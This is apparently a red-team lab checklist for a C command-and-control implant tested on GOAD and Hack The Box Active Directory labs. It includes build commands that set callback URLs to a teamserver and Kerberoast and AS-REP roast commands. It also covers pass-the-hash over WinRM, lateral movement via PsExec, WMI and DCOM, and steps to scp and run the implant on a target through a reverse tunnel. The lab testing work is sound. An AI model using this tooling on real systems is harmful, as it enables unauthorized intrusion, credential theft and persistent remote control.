# C Implant Lab Checklist (GOAD + HTB)

**Purpose:** Prove AD-complete path on the C implant. No placeholder hashes.  
**Binary:** `make implant-c` / `generate --language c --os windows`  
**CA:** base64 **DER** of teamserver CA (`openssl x509 -in ca.pem -outform DER | base64 -w0`). Empty CA → HTTPS posts fail closed.

---

## 0. Build smoke (operator host)

C implant HTTPS pin is **base64 DER** of the teamserver CA (not base64 of the PEM file).  
Pass `CA_CERT_PATH` and the Makefile converts PEM→DER→b64 automatically.

```bash
make -C cimplant test-host

# Prefer CA_CERT_PATH (auto DER). Fails closed if CA/ID/secret empty for HTTPS.
make implant-c \
  CALLBACK_URL=https://<C2>:8443 \
  CA_CERT_PATH=$HOME/.erebus/ca-cert.pem \
  SLEEP_MS=500 JITTER_PCT=10
# → build/implant_c.exe

make implant-c-linux \
  CALLBACK_URL=https://127.0.0.1:8443 \
  CA_CERT_PATH=$HOME/.erebus/ca-cert.pem \
  SLEEP_MS=500 JITTER_PCT=10
# → build/implant_c_linux
```

**Beacon timing:** C implant uses **Unix millisecond** HMAC timestamps so `SLEEP_MS=500` no longer collides with the server replay cache (same wall second). Prefer ≥500 ms for lab; ≥1 s on flaky links.

**WinRM PTH:** `ntlm_hash` = 32-hex NT or `LM:NT`. Failures return reason strings (bad hash form, HTTP 401, etc.).  
Go implant **password and hash paths** seal SOAP (NTLM message encryption / SPNEGO) when Sign/Seal is negotiated — works with `AllowUnencrypted=false`. Live pypsrp parity still eng-verify.  
**Auth drops:** teamserver logs `unknown_implant|hmac|skew|replay|parse|io` — see `docs/OPERATOR_INBOUND.md`.

- [ ] Host unit tests green (`pathjail`, `pb-copy`, `kerberoast-pb`, `ntlm-parse`)  
- [ ] PE / Linux peer builds without error  
- [ ] Empty `CA_CERT_PATH` + HTTPS → make errors (fail closed)  

---

## 1. Session smoke (lab Windows host)

| Step | Command / check | Pass? |
|------|-----------------|-------|
| Register | implant runs; `sessions` shows host | |
| Beacon | `shell whoami` | |
| Files | path jail rejects `..` | |
| CA | wrong/empty CA does **not** silently succeed | |

---

## 2. Kerberoast verify (Phase 0 gate)

**GOAD** and **HTB AD** both.

```text
ldap-enum kerberoastable --domain <DOMAIN> --dc <DC>
# approve if gated
kerberoast --domain <DOMAIN> --dc <DC> --user <u> --pass <p>
loot
```

| Check | Pass? |
|-------|-------|
| LDAP returns SPNs | |
| Hashes look like `$krb5tgs$23$…` or `$krb5tgs$17|18$…` | |
| Offline crack or known-lab password confirms | |
| Bad password → clear failure (no fake hash) | |

**Code status (2026-08-07):** real AS-REQ → TGS → hashcat lines; empty SPN list → empty result (no placeholders); operator-facing error strings on bind/AS fail.  

**Lab status:** _fill after run_ — verified on: [ ] GOAD  [ ] HTB  

---

## 3. Golden Demo 5/5 Auto (C only)

Frozen objective: recon → LDAP kerberoastable → kerberoast → summarize.  
No LSASS / persist / lateral.

| Run | Result | Notes |
|-----|--------|-------|
| 1 | | |
| 2 | | |
| 3 | | |
| 4 | | |
| 5 | | |

- [ ] 5 consecutive Auto runs logged  

---

## 4. AS-REP roast

```text
asreproast --domain <DOMAIN> --dc <DC> --user <optional>
# or list users without pre-auth; empty list enumerates via LDAP (anon may fail)
```

| Check | Pass? |
|-------|-------|
| `$krb5asrep$23$…` or AES form | |
| Non-roastable user skipped / no fake hash | |
| Prefer explicit `--user` if LDAP anon denied | |

---

## 5. Lateral (after AD)

| Method | How | Lab proof | Pass? |
|--------|-----|-----------|-------|
| WinRM password | WSMan Negotiate | | |
| WinRM PTH | `ntlm_hash` (32 hex NT or LM:NT), no password | | |
| PsExec | password + **payload** bytes → ADMIN$ + service | | |
| WMI | COM `Win32_Process.Create` (password) | | |
| DCOM | MMC20 `ExecuteShellCommand` (password) | | |

Notes:
- PsExec hash-only is **not** supported (WNet); use WinRM PTH.
- WMI/DCOM hash-only: use WinRM PTH instead.

---

## 6. Linux C peer (deepen track)

```bash
# Host smoke (build + unit tests; no HTB required)
./scripts/c_linux_e2e_smoke.sh

# Or manual build (CA_CERT_PATH auto PEM→DER):
make implant-c-linux \
  CALLBACK_URL=https://127.0.0.1:8443 \
  CA_CERT_PATH=$HOME/.erebus/ca-cert.pem \
  SLEEP_MS=500
```

### Firewalled HTB (no route to operator VPN)

Many boxes (FireFlow, DarkZeroReturns) block outbound to `tun0`. Use reverse tunnel:

```bash
# Operator: teamserver HTTPS :8443
./scripts/htb_reverse_tunnel.sh user@TARGET_IP
# Target implant must be built with CALLBACK_URL=https://127.0.0.1:8443
scp build/implant_c_linux user@TARGET:/tmp/
ssh user@TARGET 'chmod +x /tmp/implant_c_linux && /tmp/implant_c_linux'
```

| Check | Pass? |
|-------|-------|
| Host unit tests + build (`c_linux_e2e_smoke.sh`) | |
| Register + shell (via tunnel if needed) | |
| File / process / ifconfig | |
| Unsupported tasks (socks, kerberoast) return **explicit** errors | |
| SOCKS / localhost pivot | **Not on Linux C** — tunnel + Ligolo or Go reverse SOCKS |

**Pivot policy:** Linux C is a thin post-foothold peer. Reverse SOCKS over beacon is Go-only; document tunnel helpers instead of half-wired SOCKS.
---

## Sign-off

| Milestone | Owner | Date |
|-----------|-------|------|
| V0 Kerberoast | | |
| M0 Golden Demo | | |
| M3 AS-REP + AES | | |
| M2 Lateral | | |
